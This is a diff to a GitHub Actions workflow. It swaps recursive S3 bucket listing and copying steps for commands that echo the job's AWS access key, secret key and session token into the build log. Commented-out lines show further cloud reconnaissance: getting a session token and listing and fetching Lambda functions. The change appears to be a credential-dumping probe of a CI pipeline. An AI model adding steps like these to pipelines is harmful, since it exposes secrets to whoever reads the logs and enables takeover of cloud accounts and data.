@@ -14,15 +14,18 @@ jobs:
           aws-region: us-east-1 
       - name: Additional Steps...
         run: |
-          aws s3 ls s3://code9bab03acc99894ec --recursive
-          aws s3 cp s3://code9bab03acc99894ec --recursive
-          echo hello
-          aws s3 ls s3://platform-bucket-373958419501-us-east-1 --recursive
-          aws s3 cp s3://platform-bucket-373958419501-us-east-1 --recursive
-          echo hello
-          aws s3 ls s3://site89d6e1f0ac68fa77 --recursive
-          aws s3 cp s3://site89d6e1f0ac68fa77 --recursive
-          echo hello
+          echo $AWS_ACCESS_KEY_ID
+          echo $AWS_SECRET_ACCESS_KEY
+          echo $AWS_SESSION_TOKEN
+#          aws s3 ls s3://code9bab03acc99894ec --recursive
+#          aws s3 cp s3://code9bab03acc99894ec --recursive
+ #         echo hello
+  #        aws s3 ls s3://platform-bucket-373958419501-us-east-1 --recursive
+   #       aws s3 cp s3://platform-bucket-373958419501-us-east-1 --recursive
+    #      echo hello
+     #     aws s3 ls s3://site89d6e1f0ac68fa77 --recursive
+      #    aws s3 cp s3://site89d6e1f0ac68fa77 --recursive
+       #   echo hello
 #          aws sts get-session-token
 #          aws lambda list-functions
 #          aws lambda get-function --function-name nslookupv2
